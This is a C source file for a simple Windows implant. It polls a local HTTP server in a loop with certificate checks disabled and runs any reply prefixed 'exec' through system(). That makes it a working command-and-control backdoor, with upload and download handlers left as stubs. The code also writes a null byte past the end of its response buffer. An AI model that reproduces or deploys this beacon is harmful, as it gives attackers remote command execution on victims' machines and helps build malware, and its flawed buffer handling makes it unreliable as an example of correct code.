#include <stdio.h>
#include <Windows.h>
#include <winhttp.h>

#define URL_SIZE 512
#pragma comment(lib, "winhttp.lib")

#define DEBUG

#define SAFE_FREE(x) if(x){free(x);x=NULL;}
#ifdef DEBUG
 #define DEBUG_PRINT(...) dprintf(__VA_ARGS__)
#else
 #define DEBUG_PRINT(...) do {} while (0)
#endif

#define URL_MAX_SIZE 512
#define USER_AGENT_MAX_SIZE 512

_inline void dprintf(char *format, ...) {
	va_list args;
	char buffer[1024];
	va_start(args, format);
	vsnprintf_s(buffer, sizeof(buffer), sizeof(buffer) - 3, format, args);
	strcat_s(buffer, sizeof(buffer), "\r\n");
	printf(buffer);
	va_end(args);
}

typedef struct _Remote {
    HINTERNET session;
    HINTERNET connection;
    HINTERNET request;

    BOOL ssl;
    wchar_t url[URL_MAX_SIZE];
    wchar_t* uri;
    wchar_t user_agent[USER_AGENT_MAX_SIZE];

    PUCHAR packet_buffer;
    DWORD  packet_buffer_size;
} Remote;

Remote REMOTE_INFO;

DWORD MyHTTPConnect(Remote* remote_info) {
    URL_COMPONENTS bits;
    DWORD error;
    wchar_t tmpHostName[URL_SIZE];
	wchar_t tmpUrlPath[URL_SIZE];
    
    // Note: This connection-style simply uses the system default proxy
    if (!remote_info->session) {
        remote_info->session = WinHttpOpen ( remote_info->user_agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0 );
        if (!remote_info->session) {
            error = GetLastError();
            DEBUG_PRINT("Unable to open session: %d", error);
    		return error;
        }
    }

    ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = URL_SIZE - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URL_SIZE - 1;
	bits.lpszUrlPath = tmpUrlPath;

	WinHttpCrackUrl(remote_info->url, 0, 0, &bits);
    DEBUG_PRINT("HostName: %ls", bits.lpszHostName);
    DEBUG_PRINT("URL Path: %ls", bits.lpszUrlPath);
	
    SAFE_FREE(remote_info->uri);
    remote_info->uri = _wcsdup(tmpUrlPath);
	remote_info->connection = WinHttpConnect(remote_info->session, tmpHostName, bits.nPort, 0);
    if (!remote_info->connection) {
            error = GetLastError();
            DEBUG_PRINT("Unable to open connection: %d", error);
    		return error;
    }
    return ERROR_SUCCESS;
}

DWORD SendData(Remote* remote_info, BOOL get_response, PUCHAR data, DWORD length) {
    DWORD error;
    DWORD flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
    HINTERNET request = NULL;
    DWORD server_data_size = 0;
    DWORD data_retrieved = 0;
    DWORD written_size = 0;


    if (!remote_info->connection) {
        error = MyHTTPConnect(remote_info);
        if (error) {
            DEBUG_PRINT("Failed to establish connection: %d", error);
            return error;
        }
    }

	if (remote_info->ssl)
		flags |= WINHTTP_FLAG_SECURE;

    request = WinHttpOpenRequest ( remote_info->connection, get_response ? L"GET" : L"POST", remote_info->uri, NULL, NULL, NULL, flags );
    if (!request) { 
        DEBUG_PRINT("remote_info.connection: %p", remote_info->connection);
        DEBUG_PRINT("remote_info.uri: %s", remote_info->uri);
        error = GetLastError();
        DEBUG_PRINT("Failed to open connection: %d", error);
        return error;
    }

	if (remote_info->ssl) {
		flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
			| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
			| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
			| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
		if (!WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
			DEBUG_PRINT("Failed to set security flags");
		}
	}

    if (!WinHttpSendRequest ( request, NULL, 0, data, length, length, 0 )) {
        DEBUG_PRINT("Failed to send data.");
        return ERROR_CONNECTION_ABORTED;
    }

    DEBUG_PRINT("Data sent successfully");

    if (get_response) {

        // Keep checking for data until there is nothing left.
        if (WinHttpReceiveResponse(request, NULL)) {
            do
            {
                // Check for available data.
                server_data_size = 0;
                if (!WinHttpQueryDataAvailable(request, &server_data_size)) {
                    DEBUG_PRINT("Error %u in WinHttpQueryDataAvailable.", GetLastError());
                    break;
                }
                if (server_data_size == 0) { break; }

                // Allocate space for the buffer.
                remote_info->packet_buffer_size = written_size + server_data_size;
                remote_info->packet_buffer = realloc(remote_info->packet_buffer, remote_info->packet_buffer_size);
                if (!remote_info->packet_buffer)
                {
                    DEBUG_PRINT("Out of memory");
                    break;
                }
                else
                {
                    // Read the data.
                    if (!WinHttpReadData(request, (LPVOID)(remote_info->packet_buffer + written_size), server_data_size, &data_retrieved)) {
                        DEBUG_PRINT("Error %u in WinHttpReadData.", GetLastError());
                        break;
                    }
                    written_size += data_retrieved;
                }
            } while (server_data_size > 0);
        }
    }

    if (request) WinHttpCloseHandle(request);
    return ERROR_SUCCESS;
}

Remote* init_remote(wchar_t* url, BOOL use_ssl) {
    wcsncpy(REMOTE_INFO.url, url, URL_MAX_SIZE);
    wcsncpy(REMOTE_INFO.user_agent, L"Mozilla/Test", USER_AGENT_MAX_SIZE);

    REMOTE_INFO.ssl = use_ssl;
    REMOTE_INFO.connection    = NULL;
    REMOTE_INFO.session       = NULL;
    REMOTE_INFO.uri           = NULL;
    REMOTE_INFO.packet_buffer = NULL;
    REMOTE_INFO.packet_buffer_size = 0;

    return &REMOTE_INFO;
}

int main(int argc, char** argv) {
    Remote* remote_info = init_remote(L"http://127.0.0.1/node/1a1a", FALSE);

    while (1) {
        SendData(remote_info, TRUE, "hi", 2);
        if(remote_info->packet_buffer) {
            if (!strncmp("exec", remote_info->packet_buffer, 4)) {
                remote_info->packet_buffer[remote_info->packet_buffer_size] = '\0';
                system(remote_info->packet_buffer+5);
            }
            else if (!strncmp("upload", remote_info->packet_buffer, 6)) {
                //todo
            }
            else if (!strncmp("download", remote_info->packet_buffer, 6)) {
                //todo
            }
        }
        Sleep(10000);
    }
}